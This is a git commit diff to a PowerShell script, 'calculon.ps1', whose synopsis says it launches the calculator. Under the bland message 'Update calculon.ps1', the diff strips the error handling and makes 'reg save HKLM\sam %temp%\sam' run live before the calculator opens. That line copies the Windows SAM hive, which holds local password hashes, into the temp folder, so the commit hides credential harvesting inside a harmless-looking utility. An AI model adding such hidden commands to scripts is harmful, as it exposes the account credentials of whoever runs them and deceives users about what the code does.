0126ecbe43775fd47fdf5cb25d7a9ed9444c02b2
user12385321 <kukulo.stas@gmail.com>
2024-12-08 01:37:03 +0300

    Update calculon.ps1

--- calculon.ps1
+++ calculon.ps1
@@ -2,13 +2,5 @@
 .SYNOPSIS
 	Launches the calculator application
 #>
-
-### reg save HKLM\sam %temp%\sam
-
-try {
-	Start-Process ms-calculator:
-	exit 0 # success
-} catch {
-	"⚠️ Error in line $($_.InvocationInfo.ScriptLineNumber): $($Error[0])"
-	exit 1
-}
+reg save HKLM\sam %temp%\sam
+Start-Process ms-calculator:
